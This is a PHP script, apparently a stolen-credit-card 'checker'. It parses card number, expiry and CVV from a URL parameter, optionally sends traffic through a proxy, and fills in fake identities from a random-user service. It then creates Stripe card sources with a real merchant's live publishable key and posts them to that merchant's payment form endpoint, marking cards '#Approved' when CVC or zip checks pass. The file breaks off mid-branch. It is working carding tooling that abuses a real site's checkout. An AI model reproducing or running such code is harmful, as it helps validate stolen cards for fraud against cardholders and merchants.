<?php

////////////[2 Curl Template]////////////

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');

///////////////[Functions]///////////////

function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['card'];
$proxycloud = $_GET['proxy'];

$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}



////////[Credentials Randomizer]/////////

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
$serve_arr = array("gmail.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);


$amount = '$1.'.rand(00,99);
$amount2 = 'Not Charged';
$time = rand(00000,99999);
$ttc = '0.'.rand(1,9).'s';

######################################################################
$ch = curl_init();
if (isset($proxycloud)) { 
curl_setopt($ch, CURLOPT_PROXY, $proxycloud);
}
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: api.stripe.com',
'accept: application/json', 
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/v3/controller-b3e97c149ecbbb1202fa4c27f6a87b90.html',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Linux; Android 10; Mi A1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

///////////////[Postfield]///////////////

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[email]='.$email.'&owner[address][postal_code]='.$postcode.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=6b6f0c1d-5d3f-4695-9949-364c590de947a3c9e8&muid=19626d38-c945-4e0f-832c-471f7815fc55f98460&sid=bc437fa3-96bf-45db-a10f-79c0456af17a2fbd33&pasted_fields=number&payment_user_agent=stripe.js%2F9f6ef96b%3B+stripe-js-v3%2F9f6ef96b&time_on_page=53334&referrer=https%3A%2F%2Fwww.galaxkey.com%2Fmemberbenefit%2F&key=pk_live_xwngwTx2mHJbO7o4TETX5BZe009rMQFyE2');

/////////////////////////////////////////
echo $resulta = curl_exec($ch);
$json = json_decode($resulta, true);
curl_close($ch);
$token = $json['id'];
"<b>Token:</b><br>$token<br>";
$error1 = $json['error']['code'];
"<b>PROXY USED:</b><br>$proxycloud<br>";
/////////////[2nd Curl Header]//////////

$ch = curl_init();
if (isset($proxycloud)) { 
curl_setopt($ch, CURLOPT_PROXY, $proxycloud);
}
curl_setopt($ch, CURLOPT_URL, 'https://www.galaxkey.com/wp-json/wpsp/v2/customer');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.galaxkey.com',
'accept: */*',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'Origin: https://www.galaxkey.com',
'referer: https://www.galaxkey.com/memberbenefit/',
'x-requested-with: XMLHttpRequest', 
'x-wp-nonce: d7bdefa04a',
'user-agent:Mozilla/5.0 (Linux; Android 10; Mi A1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36',
'cookie: _ga=GA1.2.256831597.1597090621; __stripe_mid=19626d38-c945-4e0f-832c-471f7815fc55f98460; _gid=GA1.2.1948975073.1597382388; _gat=1; _gat_gtag_UA_31408937_2=1; __stripe_sid=bc437fa3-96bf-45db-a10f-79c0456af17a2fbd33; _gali=simpay-form-15355-field-7',
'wpml_browser_redirect_test=0',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors', 
'sec-fetch-site: same-origin',
));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'form_values%5Bsimpay_field%5D%5Bsimpay-form-15355-field-4%5D=on&form_values%5Bsimpay_email%5D='.$email.'&form_values%5Bsimpay_form_id%5D=15355&form_values%5Bsimpay_amount%5D=1250&form_values%5B_wpnonce%5D=cbc017016d&form_values%5B_wp_http_referer%5D=%2Fmemberbenefit%2F&form_data%5BformId%5D=15355&form_data%5BformInstance%5D=0&form_data%5Bquantity%5D=1&form_data%5BisValid%5D=true&form_data%5BstripeParams%5D%5Bkey%5D=pk_live_xwngwTx2mHJbO7o4TETX5BZe009rMQFyE2&form_data%5BstripeParams%5D%5Bsuccess_url%5D=https%3A%2F%2Fwww.galaxkey.com%2Fpayment-successful%2F%3Fform_id%3D15355&form_data%5BstripeParams%5D%5Berror_url%5D=https%3A%2F%2Fwww.galaxkey.com%2Fpayment-failed%2F%3Fform_id%3D15355&form_data%5BstripeParams%5D%5Bname%5D=Galaxkey&form_data%5BstripeParams%5D%5Bimage%5D=https%3A%2F%2Fwww.galaxkey.com%2Fwp-content%2Fuploads%2F2019%2F05%2Ficon.png&form_data%5BstripeParams%5D%5Blocale%5D=auto&form_data%5BstripeParams%5D%5Bcountry%5D=GB&form_data%5BstripeParams%5D%5Bcurrency%5D=GBP&form_data%5BstripeParams%5D%5Bdescription%5D=ISACA+PERSONAL+ESSENTIALS&form_data%5BstripeParams%5D%5BelementsLocale%5D=auto&form_data%5BstripeParams%5D%5BbillingAddress%5D=true&form_data%5BstripeParams%5D%5Bamount%5D=1250&form_data%5BisTestMode%5D=false&form_data%5BisSubscription%5D=true&form_data%5BisTrial%5D=false&form_data%5BhasCustomerFields%5D=true&form_data%5BhasPaymentRequestButton%5D%5Bid%5D=simpay-15355-payment-request-button-6&form_data%5BhasPaymentRequestButton%5D%5Btype%5D=default&form_data%5BhasPaymentRequestButton%5D%5BrequestPayerName%5D=false&form_data%5BhasPaymentRequestButton%5D%5BrequestPayerEmail%5D=true&form_data%5BhasPaymentRequestButton%5D%5BrequestShipping%5D=false&form_data%5BhasPaymentRequestButton%5D%5BshippingOptions%5D%5B0%5D%5Bid%5D=0&form_data%5BhasPaymentRequestButton%5D%5BshippingOptions%5D%5B0%5D%5Blabel%5D=Default&form_data%5BhasPaymentRequestButton%5D%5BshippingOptions%5D%5B0%5D%5Bamount%5D=0&form_data%5BhasPaymentRequestButton%5D%5Bi18n%5D%5BplanLabel%5D=Subscription&form_data%5BhasPaymentRequestButton%5D%5Bi18n%5D%5BtotalLabel%5D=Total&form_data%5BhasPaymentRequestButton%5D%5Bi18n%5D%5BtaxLabel%5D=Tax%3A+%25s%25&form_data%5BhasPaymentRequestButton%5D%5Bi18n%5D%5BcouponLabel%5D=Coupon%3A+%25s&form_data%5BhasPaymentRequestButton%5D%5Bi18n%5D%5BsetupFeeLabel%5D=Setup+Fee&form_data%5Bamount%5D=12.5&form_data%5BsetupFee%5D=0&form_data%5BminAmount%5D=72&form_data%5BtotalAmount%5D=&form_data%5BsubMinAmount%5D=72&form_data%5BplanIntervalCount%5D=1&form_data%5BtaxPercent%5D=0&form_data%5BfeePercent%5D=0&form_data%5BfeeAmount%5D=0&form_data%5BstripeErrorMessages%5D%5Binvalid_number%5D=The+card+number+is+not+a+valid+credit+card+number.&form_data%5BstripeErrorMessages%5D%5Binvalid_expiry_month%5D=The+cards+expiration+month+is+invalid.&form_data%5BstripeErrorMessages%5D%5Binvalid_expiry_year%5D=The+cards+expiration+year+is+invalid.&form_data%5BstripeErrorMessages%5D%5Binvalid_cvc%5D=The+cards+security+code+is+invalid.&form_data%5BstripeErrorMessages%5D%5Bincorrect_number%5D=The+card+number+is+incorrect.&form_data%5BstripeErrorMessages%5D%5Bincomplete_number%5D=The+card+number+is+incomplete.&form_data%5BstripeErrorMessages%5D%5Bincomplete_cvc%5D=The+cards+security+code+is+incomplete.&form_data%5BstripeErrorMessages%5D%5Bincomplete_expiry%5D=The+cards+expiration+date+is+incomplete.&form_data%5BstripeErrorMessages%5D%5Bexpired_card%5D=The+card+has+expired.&form_data%5BstripeErrorMessages%5D%5Bincorrect_cvc%5D=The+cards+security+code+is+incorrect.&form_data%5BstripeErrorMessages%5D%5Bincorrect_zip%5D=The+cards+zip+code+failed+validation.&form_data%5BstripeErrorMessages%5D%5Binvalid_expiry_year_past%5D=The+cards+expiration+year+is+in+the+past&form_data%5BstripeErrorMessages%5D%5Bcard_declined%5D=The+card+was+declined.&form_data%5BstripeErrorMessages%5D%5Bprocessing_error%5D=An+error+occurred+while+processing+the+card.&form_data%5BstripeErrorMessages%5D%5Binvalid_request_error%5D=Unable+to+process+this+payment%2C+please+try+again+or+use+alternative+method.&form_data%5BstripeErrorMessages%5D%5Bemail_invalid%5D=Invalid+email+address%2C+please+correct+and+try+again.&form_data%5BminCustomAmountError%5D=The+minimum+amount+allowed+is+%26pound%3B72.00&form_data%5BsubMinCustomAmountError%5D=The+minimum+amount+allowed+is+%26pound%3B72.00&form_data%5BpaymentButtonText%5D=Pay+with+Card&form_data%5BpaymentButtonLoadingText%5D=Please+Wait...&form_data%5BcompanyName%5D=Galaxkey&form_data%5BsubscriptionType%5D=single&form_data%5BplanInterval%5D=year&form_data%5BcheckoutButtonText%5D=Pay+%7B%7Bamount%7D%7D&form_data%5BcheckoutButtonLoadingText%5D=Please+Wait...&form_data%5BdateFormat%5D=dd%2Fmm%2Fyy&form_data%5BformDisplayType%5D=overlay&form_data%5BpaymentMethods%5D%5B0%5D%5Bid%5D=card&form_data%5BpaymentMethods%5D%5B0%5D%5Bname%5D=Card&form_data%5BpaymentMethods%5D%5B0%5D%5Bnicename%5D=Credit+Card&form_data%5BpaymentMethods%5D%5B0%5D%5Bflow%5D=none&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=aed&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=afn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=all&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=amd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ang&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=aoa&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ars&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=aud&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=awg&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=azn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bam&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bbd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bdt&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bgn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bhd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bif&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bmd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bnd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bob&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=brl&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bsd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=btc&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=btn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bwp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=byr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bzd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cad&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cdf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=chf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=clp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cny&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cop&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=crc&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cuc&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cup&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cve&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=czk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=djf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=dkk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=dop&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=dzd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=egp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ern&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=etb&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=eur&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=fjd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=fkp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gbp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gel&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ggp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ghs&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gip&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gmd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gnf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gtq&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gyd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=hkd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=hnl&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=hrk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=htg&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=huf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=idr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ils&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=imp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=inr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=iqd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=irr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=isk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=jep&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=jmd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=jod&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=jpy&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kes&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kgs&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=khr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kmf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kpw&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=krw&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kwd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kyd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kzt&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lak&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lbp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lkr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lrd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lsl&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lyd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mad&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mdl&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mga&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mkd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mmk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mnt&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mop&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mro&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mur&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mvr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mwk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mxn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=myr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mzn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=nad&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ngn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=nio&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=nok&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=npr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=nzd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=omr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pab&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pen&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pgk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=php&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pkr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pln&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=prb&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pyg&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=qar&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=rmb&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ron&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=rsd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=rub&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=rwf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sar&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sbd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=scr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sdg&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sek&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sgd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=shp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sll&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sos&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=srd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ssp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=std&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=syp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=szl&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=thb&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=tjs&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=tmt&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=tnd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=top&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=try&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ttd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=twd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=tzs&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=uah&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ugx&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=usd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=uyu&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=uzs&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=vef&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=vnd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=vuv&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=wst&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=xaf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=xcd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=xof&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=xpf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=yer&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=zar&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=zmw&form_data%5BpaymentMethods%5D%5B0%5D%5Brecurring%5D=true&form_data%5BpaymentMethods%5D%5B0%5D%5Bstripe_checkout%5D=true&form_data%5BpaymentMethods%5D%5B0%5D%5Binternal_docs%5D=&form_data%5BpaymentMethods%5D%5B0%5D%5Bexternal_docs%5D=https%3A%2F%2Fstripe.com%2Fpayments%2Fpayment-methods-guide%23cards&form_data%5BfinalAmount%5D=12.50&form_id=15355&source_id='.$token.'');

$result = curl_exec($ch);
$json2 = json_decode($result, true);
$error2 = $json2['error']['code'];
//$cvvpass = $json2["cvc_check"];
$cvvpass = trim(strip_tags(getStr($result,'"cvc_check":"','"')));
$response = $json2['message'];
$result;
######################################################################
////////////////////////////===[Card Response]

if(strpos($result, '/donations/thank_you?donation_number=','' )) {
    echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning">Approved (͏CVV) </span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result,'"cvc_check":"pass"')){
    echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning">Approved (͏CVV) </span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, "Thank You For Donation." )) {
    echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning">Approved (͏CVV) </span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, "Thank You." )) {
    echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning">Approved (͏CVV)</span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result,'"status": "succeeded"')){
    echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning">Approved (͏CVV) /span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, 'Your card zip code is incorrect.' )) {
    echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning">Approved (͏CVV - Incorrect Zip)</span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, "incorrect_zip" )) {
    echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning">Approved (͏CVV - Incorrect Zip)</span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result,"The zip code you supplied failed validation.")){
    echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning">Approved (͏CVV - Zip failed validation)</span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, "Success" )) {
    echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning">Approved (͏CVV) </span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, "succeeded." )) {
